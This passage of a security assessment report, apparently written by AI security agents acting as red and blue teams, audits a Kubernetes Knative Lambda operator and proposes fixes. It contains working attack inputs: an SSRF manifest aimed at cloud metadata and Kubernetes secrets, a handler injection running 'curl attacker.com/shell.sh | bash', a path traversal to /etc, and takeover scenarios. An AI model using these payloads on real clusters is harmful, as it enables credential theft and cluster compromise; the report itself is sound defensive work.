    // Validate all fields
    if err := ValidateLambdaFunction(lambda); err != nil {
        return admission.Denied(err.Error())
    }
    
    return admission.Allowed("")
}

func ValidateLambdaFunction(lambda *lambdav1alpha1.LambdaFunction) error {
    // Call all validation functions
    if err := ValidateSourceSpec(&lambda.Spec.Source); err != nil {
        return fmt.Errorf("source validation failed: %w", err)
    }
    if err := ValidateRuntimeSpec(&lambda.Spec.Runtime); err != nil {
        return fmt.Errorf("runtime validation failed: %w", err)
    }
    // ... more validations
    return nil
}
```

```yaml
# k8s/base/webhook.yaml
---
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingWebhookConfiguration
metadata:
  name: knative-lambda-validating-webhook
webhooks:
  - name: vlambdafunction.lambda.knative.io
    clientConfig:
      service:
        name: knative-lambda-operator-webhook
        namespace: knative-lambda
        path: /validate-lambda-knative-io-v1alpha1-lambdafunction
    rules:
      - apiGroups: ["lambda.knative.io"]
        apiVersions: ["v1alpha1"]
        operations: ["CREATE", "UPDATE"]
        resources: ["lambdafunctions"]
    failurePolicy: Fail
    sideEffects: None
    admissionReviewVersions: ["v1"]
```

#### Files to Modify
1. Create: `src/operator/internal/webhook/validating_webhook.go`
2. Create: `k8s/base/webhook.yaml`
3. `src/operator/cmd/main.go` - Register webhook handler
4. `k8s/base/service.yaml` - Add webhook service
5. TLS certificate management for webhook

---

## 🔵 LOW SEVERITY ISSUES

### VULN-015: Hardcoded Default Values

| Field | Value |
|-------|-------|
| **ID** | VULN-015 |
| **Severity** | 🔵 LOW |
| **Status** | OPEN |

#### Affected Files
- `src/operator/internal/build/manager.go` (lines 44-53)
- `src/operator/internal/eventing/manager.go` (lines 72-91)

#### Description
Multiple hardcoded default values for endpoints, timeouts, and resource limits.

#### Remediation
Move all defaults to ConfigMap or environment variables for easier configuration.

---

### VULN-016: Missing Pod Security Standards Enforcement

| Field | Value |
|-------|-------|
| **ID** | VULN-016 |
| **Severity** | 🔵 LOW |
| **Status** | OPEN |

#### Affected Files
- `k8s/base/namespace.yaml` (missing)

#### Remediation
```yaml
# k8s/base/namespace.yaml
apiVersion: v1
kind: Namespace
metadata:
  name: knative-lambda
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/audit: restricted
    pod-security.kubernetes.io/warn: restricted
```

---

### VULN-017: Short TTL for Build Jobs

| Field | Value |
|-------|-------|
| **ID** | VULN-017 |
| **Severity** | 🔵 LOW |
| **Status** | OPEN |

#### Affected Files
- `src/operator/internal/build/manager.go` (line 42)

#### Description
`JobTTLAfterFinished = 300` (5 minutes) makes forensic analysis difficult.

#### Remediation
Increase to 24 hours or make configurable:
```go
JobTTLAfterFinished = int32(86400) // 24 hours
```

---

### VULN-018: Verbose Logging of Sensitive Operations

| Field | Value |
|-------|-------|
| **ID** | VULN-018 |
| **Severity** | 🔵 LOW |
| **Status** | OPEN |

#### Description
Build operations log credential retrieval steps that could aid attackers.

#### Remediation
Reduce log verbosity for sensitive operations, audit log access.

---

## 🎯 ATTACK SCENARIOS

### Scenario 1: Full Cluster Compromise via Command Injection

```
1. Attacker creates LambdaFunction with malicious Git URL
2. Build job executes injected commands
3. Attacker retrieves SA token from build pod
4. Uses token to access Kubernetes API
5. Creates cluster-admin ClusterRoleBinding
6. Full cluster access achieved
```

### Scenario 2: Secret Exfiltration via Inline Source

```
1. Attacker creates LambdaFunction with inline code
2. Code reads SA token and environment variables
3. Data exfiltrated to external server
4. Attacker uses credentials to access cloud services
5. Database dumps, API keys exposed
```

### Scenario 3: Supply Chain Attack via Registry MITM

```
1. Attacker positions on network path to registry
2. Intercepts image push from Kaniko
3. Modifies image layers to include backdoor
4. Lambda pods run with malicious code
5. Persistent cluster access maintained
```

---

## 📋 REMEDIATION PRIORITY MATRIX

### Phase 1: Immediate (Week 1)
| ID | Action | Effort | Owner |
|----|--------|--------|-------|
| VULN-001 | Fix Git script injection | 4h | Backend |
| VULN-002 | Fix MinIO/S3 script injection | 4h | Backend |
| VULN-007 | Remove insecure registry flags | 2h | Backend |
| VULN-009 | Add CRD field validation | 4h | Backend |

### Phase 2: Short-Term (Week 2-3)
| ID | Action | Effort | Owner |
|----|--------|--------|-------|
| VULN-004 | Scope down RBAC | 1d | Platform |
| VULN-005 | Remove RBAC management perms | 2h | Platform |
| VULN-006 | Validate Python handlers | 4h | Backend |
| VULN-014 | Implement admission webhook | 2d | Backend |

### Phase 3: Medium-Term (Week 4-6)
| ID | Action | Effort | Owner |
|----|--------|--------|-------|
| VULN-003 | Address inline source risks | 2d | Backend/Arch |
| VULN-008 | Fix cross-namespace secrets | 1d | Platform |
| VULN-010 | Encrypt build context | 4h | Backend |
| VULN-012 | Implement NetworkPolicies | 1d | Platform |
| VULN-013 | Create receiver SA | 4h | Backend |

### Phase 4: Long-Term (Week 7+)
| ID | Action | Effort | Owner |
|----|--------|--------|-------|
| VULN-011 | Sanitize error messages | 2h | Backend |
| VULN-015 | Externalize defaults | 4h | Backend |
| VULN-016 | Enable Pod Security Standards | 2h | Platform |
| VULN-017 | Increase job TTL | 30m | Backend |
| VULN-018 | Reduce logging verbosity | 2h | Backend |

---

## 📁 FILES REQUIRING MODIFICATION

### Critical Priority
1. `src/operator/internal/build/templates/scripts/clone-git.sh.tmpl`
2. `src/operator/internal/build/templates/scripts/download-minio.sh.tmpl`
3. `src/operator/internal/build/templates/scripts/download-s3.sh.tmpl`
4. `src/operator/internal/build/templates/scripts/download-gcs.sh.tmpl`
5. `src/operator/internal/build/manager.go`
6. `src/operator/controllers/lambdafunction_controller.go`

### High Priority
7. `k8s/base/rbac.yaml`
8. `src/operator/internal/build/templates/runtimes/python/runtime.py.tmpl`
9. `src/operator/internal/build/templates/runtimes/nodejs/runtime.js.tmpl`
10. `src/operator/api/v1alpha1/lambdafunction_types.go`

### New Files Required
11. `src/operator/internal/validation/input_validation.go` (CREATE)
12. `src/operator/internal/webhook/validating_webhook.go` (CREATE)
13. `k8s/base/webhook.yaml` (CREATE)
14. `k8s/base/networkpolicy.yaml` (CREATE)
15. `k8s/base/receiver-rbac.yaml` (CREATE)

---

## ✅ VERIFICATION CHECKLIST

After remediation, verify:

- [ ] Git URLs with shell metacharacters are rejected
- [ ] MinIO/S3/GCS keys with path traversal are rejected
- [ ] Inline source has length limits enforced
- [ ] RBAC no longer has cluster-wide secrets access
- [ ] RBAC cannot create ClusterRoles/ClusterRoleBindings
- [ ] Python handler only accepts whitelisted modules
- [ ] Kaniko uses TLS for external registries
- [ ] Admission webhook rejects invalid CRDs
- [ ] NetworkPolicies restrict pod communication
- [ ] Receiver mode uses dedicated service account
- [ ] Error messages don't include stack traces
- [ ] Pod Security Standards enforced on namespace

---

# 🔵 BLUE TEAM SECURITY REVIEW

**Review Type:** Critical Analysis of Red Team Assessment  
**Review Date:** December 9, 2025  
**Reviewer:** AI Security Agent (Blue Team)  
**Status:** FINDINGS AND RECOMMENDATIONS - NO REMEDIATION APPLIED

---

## 📊 BLUE TEAM EXECUTIVE CRITIQUE

The Red Team assessment (18 findings) provides a solid foundation but **misses critical attack vectors** and **overstates some risks** while **understating others**. This Blue Team review validates findings and identifies additional vulnerabilities.

---

## 🔴 CRITICAL FINDINGS MISSED BY RED TEAM

### BLUE-001: SSRF via Go-Git Library (Not Shell-Based)

| Field | Value |
|-------|-------|
| **ID** | BLUE-001 |
| **Severity** | 🔴 CRITICAL |
| **CVSS Score** | 9.3 |
| **CWE** | CWE-918: Server-Side Request Forgery (SSRF) |
| **Status** | OPEN |

#### Critical Discovery

The Red Team focused on shell template injection (`clone-git.sh.tmpl`), but **the shell scripts are NOT actually used**. The actual code in `build/manager.go` (lines 592-677) uses the **go-git library directly**:

```go
// getGitSourceCode in build/manager.go - ACTUAL CODE PATH
func (m *Manager) getGitSourceCode(ctx context.Context, lambda *lambdav1alpha1.LambdaFunction) ([]byte, string, error) {
    gitSpec := lambda.Spec.Source.Git
    
    cloneOpts := &git.CloneOptions{
        URL:   gitSpec.URL,  // <-- SSRF: URL directly from CRD, NO VALIDATION!
        Depth: 1,
    }
    repo, err := git.PlainCloneContext(ctx, tmpDir, false, cloneOpts)
```

#### Attack Vector
```yaml
apiVersion: lambda.knative.io/v1alpha1
kind: LambdaFunction
metadata:
  name: ssrf-attack
spec:
  source:
    type: git
    git:
      # SSRF to AWS metadata endpoint
      url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
      # Or SSRF to Kubernetes API
      # url: "http://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets"
  runtime:
    language: python
    version: "3.11"
```

#### Impact
- **AWS/GCP Metadata Theft:** SSRF to `169.254.169.254` steals IAM credentials
- **Kubernetes Secrets Extraction:** SSRF to `kubernetes.default.svc` exposes secrets
- **Internal Service Discovery:** Map internal network services
- **Lateral Movement:** Access internal services not exposed externally

#### Remediation
```go
// Add SSRF validation before cloning
func ValidateGitURL(url string) error {
    parsed, err := neturl.Parse(url)
    if err != nil {
        return fmt.Errorf("invalid URL: %w", err)
    }
    
    // Block metadata endpoints
    blockedHosts := []string{
        "169.254.169.254",           // AWS/Azure metadata
        "metadata.google.internal",  // GCP metadata
        "kubernetes.default",        // K8s API
        "localhost", "127.0.0.1",    // Localhost
    }
    
    for _, blocked := range blockedHosts {
        if strings.Contains(parsed.Host, blocked) {
            return fmt.Errorf("blocked host: %s", parsed.Host)
        }
    }
    
    // Require HTTPS for external URLs
    if parsed.Scheme != "https" && !isInternalRegistry(parsed.Host) {
        return fmt.Errorf("HTTPS required for external URLs")
    }
    
    return nil
}
```

#### Files to Modify
1. `src/operator/internal/build/manager.go` - Add URL validation before `git.PlainCloneContext`
2. `src/operator/controllers/lambdafunction_controller.go` - Add validation in `validateSpec()`
3. Create: `src/operator/internal/validation/ssrf_validation.go`

---

### BLUE-002: Go Template Injection via Handler Field

| Field | Value |
|-------|-------|
| **ID** | BLUE-002 |
| **Severity** | 🔴 CRITICAL |
| **CVSS Score** | 9.1 |
| **CWE** | CWE-94: Code Injection |
| **Status** | OPEN |

#### Critical Discovery

The Red Team identified VULN-006 (Python dynamic import) but **missed the Go template injection** that occurs BEFORE Python even runs:

```python
# runtime.py.tmpl - The handler is interpolated via Go template
handler_parts = "{{ .Handler }}".rsplit('.', 1)
module_name, func_name = handler_parts
handler_module = __import__(module_name, fromlist=[func_name])
```

The `{{ .Handler }}` is rendered by Go's `text/template` which does **NO escaping** for Python code context.

#### Attack Vector
```yaml
spec:
  runtime:
    language: python
    version: "3.11"
    # Go template renders this, creating Python code injection
    handler: '"; import os; os.system("curl attacker.com/shell.sh | bash"); x="'
```

This renders to:
```python
handler_parts = ""; import os; os.system("curl attacker.com/shell.sh | bash"); x="".rsplit('.', 1)
```

#### Impact
- **Bypasses Python Validation:** Injection happens at Go template level
- **RCE in Lambda Pods:** Arbitrary code execution
- **Cluster Compromise:** Via service account token theft

#### Remediation
```go
// In build/manager.go - Escape handler before template rendering
func sanitizeHandler(handler string) string {
    // Only allow alphanumeric, underscore, and single dot
    if !regexp.MustCompile(`^[a-zA-Z_][a-zA-Z0-9_]*\.[a-zA-Z_][a-zA-Z0-9_]*$`).MatchString(handler) {
        return "main.handler" // Safe default
    }
    return handler
}

// Before template execution:
data := struct {
    Handler string
    // ...
}{
    Handler: sanitizeHandler(lambda.Spec.Runtime.Handler),
}
```

#### Files to Modify
1. `src/operator/internal/build/manager.go` - Sanitize handler before template rendering
2. `src/operator/api/v1alpha1/lambdafunction_types.go` - Add strict kubebuilder validation

---

### BLUE-003: MinIO Credential Exposure via Command Arguments

| Field | Value |
|-------|-------|
| **ID** | BLUE-003 |
| **Severity** | 🟠 HIGH |
| **CVSS Score** | 8.2 |
| **CWE** | CWE-522: Insufficiently Protected Credentials |
| **Status** | OPEN |

#### Critical Discovery

The Red Team focused on injection but **missed credential exposure**. The MinIO client receives credentials as environment variables that are:

1. **Visible in build job logs** (mc client may log commands)
2. **Exposed in `/proc/*/environ`** inside containers
3. **Captured in Kubernetes events** on pod creation

```bash
# download-minio.sh.tmpl - Credentials passed to mc command
mc alias set source http://{{ .Endpoint }} "$AWS_ACCESS_KEY_ID" "$AWS_SECRET_ACCESS_KEY"
```

#### Additional Concerns in build/manager.go

The code retrieves credentials from secrets and passes them via environment:
```go
// Lines 410-434 in build/manager.go
accessKey = string(secret.Data["accesskey"])
secretKey = string(secret.Data["secretkey"])
// These end up in environment variables visible to any process
```

#### Remediation
```go
// Use file-based credentials instead of environment variables
// Mount secret as file and configure mc to read from file
secretVolume := corev1.Volume{
    Name: "minio-credentials",
    VolumeSource: corev1.VolumeSource{
        Secret: &corev1.SecretVolumeSource{
            SecretName: "minio-credentials",
            Items: []corev1.KeyToPath{
                {Key: "config.json", Path: "config.json"},
            },
        },
    },
}
```

---

### BLUE-004: Race Condition in Namespace Broker Lock

| Field | Value |
|-------|-------|
| **ID** | BLUE-004 |
| **Severity** | 🟠 HIGH |
| **CVSS Score** | 7.1 |
| **CWE** | CWE-362: Race Condition |
| **Status** | OPEN |

#### Critical Discovery

The eventing manager uses in-memory locks for broker creation:

```go
// eventing/manager.go lines 167-175
func (m *Manager) ensureSharedBroker(ctx context.Context, lambda *lambdav1alpha1.LambdaFunction) error {
    lock, _ := m.namespaceLocks.LoadOrStore(namespace, &sync.Mutex{})
    mutex := lock.(*sync.Mutex)
    mutex.Lock()
    defer mutex.Unlock()
    // ...
}
```

#### Problems

1. **In-memory locks don't survive operator restarts**
2. **Multiple operator replicas (HA) have separate lock maps**
3. **Leader election failover loses lock state**

#### Impact
- Duplicate brokers created in namespace
- Orphaned Knative resources
- Inconsistent eventing infrastructure

#### Remediation
```go
// Use Kubernetes lease-based locking for distributed operations
func (m *Manager) acquireDistributedLock(ctx context.Context, namespace string) (*coordinationv1.Lease, error) {
    lease := &coordinationv1.Lease{
        ObjectMeta: metav1.ObjectMeta{
            Name:      "lambda-broker-lock-" + namespace,
            Namespace: "knative-lambda",
        },
        Spec: coordinationv1.LeaseSpec{
            HolderIdentity: ptr.To(os.Getenv("POD_NAME")),
            LeaseDurationSeconds: ptr.To(int32(30)),
        },
    }
    // Attempt to create/acquire lease
    // ...
}
```

---

### BLUE-005: Path Traversal in Git Source Path (Go Code)

| Field | Value |
|-------|-------|
| **ID** | BLUE-005 |
| **Severity** | 🟠 HIGH |
| **CVSS Score** | 7.8 |
| **CWE** | CWE-22: Path Traversal |
| **Status** | OPEN |

#### Critical Discovery

The Red Team mentioned path traversal only in shell context. The **Go code is directly vulnerable**:

```go
// build/manager.go lines 640-648
basePath := tmpDir
if gitSpec.Path != "" {
    basePath = filepath.Join(tmpDir, gitSpec.Path)  // NO validation for ../
}

// Later reads files from this path
sourceCode, err := os.ReadFile(filepath.Join(basePath, expectedFilename))
```

#### Attack Vector
```yaml
spec:
  source:
    type: git
    git:
      url: "https://github.com/legit/repo"
      path: "../../../etc"  # Traverses to /etc
```

#### Impact
- Read arbitrary files from operator pod
- Extract `/var/run/secrets/kubernetes.io/serviceaccount/token`
- Read operator configuration and secrets

#### Remediation
```go
func validatePath(basePath, requestedPath string) error {
    // Clean and resolve the full path
    fullPath := filepath.Clean(filepath.Join(basePath, requestedPath))
    
    // Ensure it's still within the base path
    if !strings.HasPrefix(fullPath, filepath.Clean(basePath)+string(os.PathSeparator)) {
        return fmt.Errorf("path traversal detected: %s", requestedPath)
    }
    
    return nil
}
```

---

### BLUE-006: Service Account Token Auto-Mount in Build Jobs

| Field | Value |
|-------|-------|
| **ID** | BLUE-006 |
| **Severity** | 🟠 HIGH |
| **CVSS Score** | 7.2 |
| **CWE** | CWE-269: Improper Privilege Management |
| **Status** | OPEN |

#### Critical Discovery

Build jobs inherit the operator's service account without explicitly disabling token auto-mount:

```go
// build/manager.go - Kaniko job creation
Spec: corev1.PodSpec{
    RestartPolicy: corev1.RestartPolicyNever,
    // MISSING: AutomountServiceAccountToken: ptr.To(false)
    // MISSING: ServiceAccountName: "kaniko-builder" (dedicated SA)
```

#### Impact
- Kaniko containers have access to operator's SA token
- Compromised builds can access Kubernetes API
- Lateral movement via operator's RBAC permissions

#### Remediation
```go
Spec: corev1.PodSpec{
    RestartPolicy:                corev1.RestartPolicyNever,
    AutomountServiceAccountToken: ptr.To(false),  // Disable token mount
    ServiceAccountName:           "kaniko-builder", // Minimal SA
```

---

### BLUE-007: No Resource Limits on Build Jobs

| Field | Value |
|-------|-------|
| **ID** | BLUE-007 |
| **Severity** | 🟡 MEDIUM |
| **CVSS Score** | 6.5 |
| **CWE** | CWE-400: Uncontrolled Resource Consumption |
| **Status** | OPEN |

#### Critical Discovery

Build jobs are created without resource limits:

```go
// build/manager.go - Kaniko container has NO resources defined
Containers: []corev1.Container{
    {
        Name:  "kaniko",
        Image: m.kanikoImage,
        Args:  []string{...},
        // NO Resources: field!
    },
}
```

#### Impact
- Malicious inline source with large code → memory exhaustion
- Fork bombs in build context → CPU exhaustion
- Cluster-wide DoS possible

#### Remediation
```go
Resources: corev1.ResourceRequirements{
    Limits: corev1.ResourceList{
        corev1.ResourceCPU:    resource.MustParse("2"),
        corev1.ResourceMemory: resource.MustParse("4Gi"),
    },
    Requests: corev1.ResourceList{
        corev1.ResourceCPU:    resource.MustParse("500m"),
        corev1.ResourceMemory: resource.MustParse("1Gi"),
    },
},
```

---

### BLUE-008: CloudEvent Payload Size Not Limited

| Field | Value |
|-------|-------|
| **ID** | BLUE-008 |
| **Severity** | 🟡 MEDIUM |
| **CVSS Score** | 6.1 |
| **CWE** | CWE-400: Uncontrolled Resource Consumption |
| **Status** | OPEN |

#### Critical Discovery

The CloudEvents receiver deserializes payloads without size limits:

```go
// webhook/cloudevents_receiver.go
// No MaxBytesReader or payload size validation before parsing
event := from_http(request.headers, request.get_data())  // In Python runtime
```

#### Attack Vector
- Send 100MB CloudEvent payload
- Deeply nested JSON (billion laughs)
- Memory exhaustion in receiver pods

#### Remediation
```go
// Add size limit middleware
const MaxPayloadSize = 1 * 1024 * 1024 // 1MB

func (r *Receiver) handleCloudEvent(w http.ResponseWriter, req *http.Request) {
    req.Body = http.MaxBytesReader(w, req.Body, MaxPayloadSize)
    // ...
}
```

---

## 🟡 RED TEAM FINDINGS CRITIQUE

### Regarding VULN-001 & VULN-002 (Shell Script Injection)

**Overstated:** The shell scripts (`clone-git.sh.tmpl`, `download-minio.sh.tmpl`) **are NOT actively used** in the production code path. The actual source retrieval uses:
- Go's `go-git` library for Git sources
- Go's MinIO SDK for MinIO/S3 sources

**However:** The scripts exist and could be wired in future versions. The templates should still be fixed or removed.

**Real Vulnerability:** BLUE-001 (SSRF via go-git) is the actual critical issue.

---

### Regarding VULN-003 (Inline Source Code Execution)

**Partially Valid:** This is **by design** for a serverless platform. Users MUST be able to run code.

**Better Framing:** The issue isn't inline source existing, but:
1. Missing runtime sandboxing (gVisor, Kata Containers)
2. Service account token exposure to user code
3. No egress network restrictions for lambda pods

**Recommendation:** Don't remove inline source; add sandboxing controls.

---

### Regarding VULN-004 (Cluster-Wide Secrets Access)

**Valid But Context Missing:** The operator **legitimately needs** secrets access for:
- Multi-tenant deployments across namespaces
- Registry credentials for image pulls

**Better Remediation:** Implement per-namespace Roles dynamically created by the operator, rather than removing capability entirely.

---

## 🎯 ADDITIONAL ATTACK SCENARIOS

### Scenario 4: Cloud Metadata Theft via SSRF

```
1. Attacker creates LambdaFunction with git source URL: http://169.254.169.254/...
2. Operator's go-git attempts to clone the "repository"
3. HTTP request goes to AWS metadata endpoint
4. IAM credentials returned as "source code" content
5. Credentials stored in ConfigMap (build context)
6. Attacker reads ConfigMap, gets AWS credentials
7. Full AWS account compromise
```

### Scenario 5: Cluster Takeover via Template Injection

```
1. Attacker sets handler: '"; __import__("os").system("..."); "'
2. Go template renders Python code with injection
3. runtime.py executes injected code at import time
4. Attacker achieves RCE in lambda pod
5. Reads service account token
6. Uses token to create cluster-admin role
7. Full cluster compromise
```

### Scenario 6: Resource Exhaustion DoS

```
1. Attacker creates 1000 LambdaFunctions with large inline sources
2. Each triggers unlimited-resource build job
3. Cluster nodes run out of memory/CPU
4. Legitimate workloads evicted
5. Control plane under resource pressure
6. Complete cluster DoS
```

---

## 📋 REVISED REMEDIATION PRIORITY MATRIX

### Phase 0: CRITICAL - Within 24-48 Hours
| ID | Action | Effort | Risk |
|----|--------|--------|------|
| **BLUE-001** | Add SSRF validation to git source | 4h | **CRITICAL** |
| **BLUE-002** | Escape handler before Go template | 2h | **CRITICAL** |
| **BLUE-005** | Block path traversal in git path | 2h | **HIGH** |

### Phase 1: Immediate - Week 1
| ID | Action | Effort | Risk |
|----|--------|--------|------|
| VULN-007 | Remove `--insecure` from Kaniko | 2h | HIGH |
| BLUE-003 | Use secret volumes for credentials | 4h | HIGH |
| BLUE-006 | Disable SA token in build pods | 2h | HIGH |
| BLUE-007 | Add resource limits to build jobs | 2h | MEDIUM |

### Phase 2: Short-Term - Week 2-3
| ID | Action | Effort | Risk |
|----|--------|--------|------|
| VULN-004 | Implement per-namespace RBAC | 1d | HIGH |
| VULN-005 | Remove ClusterRole CRUD perms | 2h | HIGH |
| BLUE-004 | Implement distributed locking | 1d | HIGH |
| VULN-014 | Implement ValidatingWebhook | 2d | MEDIUM |
| VULN-009 | Add CRD field validation | 4h | MEDIUM |

### Phase 3: Medium-Term - Week 4-6
| ID | Action | Effort | Risk |
|----|--------|--------|------|
| VULN-012 | Implement NetworkPolicies | 1d | MEDIUM |
| BLUE-008 | Add CloudEvent size limits | 4h | MEDIUM |
| VULN-013 | Create dedicated receiver SA | 4h | MEDIUM |
| VULN-003 | Implement runtime sandboxing | 3d | HIGH |

### Phase 4: Long-Term - Week 7+
| ID | Action | Effort | Risk |
|----|--------|--------|------|
| VULN-011 | Sanitize error messages | 2h | LOW |
| VULN-015 | Externalize defaults | 4h | LOW |
| VULN-016 | Pod Security Standards | 2h | LOW |
| VULN-017 | Increase job TTL | 30m | LOW |
| VULN-018 | Reduce logging verbosity | 2h | LOW |

---

## 📁 ADDITIONAL FILES REQUIRING MODIFICATION (BLUE TEAM)

### Critical Priority (NEW)
1. `src/operator/internal/build/manager.go` - SSRF validation, path traversal fix
2. `src/operator/internal/build/templates.go` - Handler sanitization
3. `src/operator/internal/eventing/manager.go` - Distributed locking

### High Priority (NEW)
4. `src/operator/internal/webhook/cloudevents_receiver.go` - Size limits
5. Create: `src/operator/internal/validation/ssrf_validation.go`
6. Create: `src/operator/internal/validation/path_validation.go`

---

## ✅ COMBINED VERIFICATION CHECKLIST

### Red Team Checks
- [ ] Git URLs with shell metacharacters are rejected
- [ ] MinIO/S3/GCS keys with path traversal are rejected
- [ ] Inline source has length limits enforced
- [ ] RBAC no longer has cluster-wide secrets access
- [ ] RBAC cannot create ClusterRoles/ClusterRoleBindings
- [ ] Python handler only accepts whitelisted modules
- [ ] Kaniko uses TLS for external registries
- [ ] Admission webhook rejects invalid CRDs
- [ ] NetworkPolicies restrict pod communication
- [ ] Receiver mode uses dedicated service account
- [ ] Error messages don't include stack traces
- [ ] Pod Security Standards enforced on namespace

### Blue Team Checks (NEW)
- [ ] **SSRF blocked:** Git URLs to metadata endpoints rejected
- [ ] **SSRF blocked:** Git URLs to internal K8s services rejected
- [ ] **Template injection blocked:** Handler field sanitized before rendering
- [ ] **Path traversal blocked:** Git path cannot escape repository root
- [ ] **Credentials protected:** MinIO creds use file mounts, not env vars
- [ ] **Build jobs isolated:** SA token not mounted in build pods
- [ ] **Resource limits:** Build jobs have CPU/memory limits
- [ ] **Payload limits:** CloudEvent size restricted
- [ ] **Distributed locks:** Broker creation uses etcd leases

---

## 📞 CONTACTS

- **Security Team:** security@example.com
- **Platform Team:** platform@example.com
- **Backend Team:** backend@example.com

---

## 📝 REVISION HISTORY

| Version | Date | Author | Changes |
|---------|------|--------|---------|
| 1.0 | 2025-12-09 | AI Security Agent (Red Team) | Initial assessment |
| 2.0 | 2025-12-09 | AI Security Agent (Blue Team) | Added Blue Team review, 8 new findings, revised priorities |

---

**END OF REPORT**
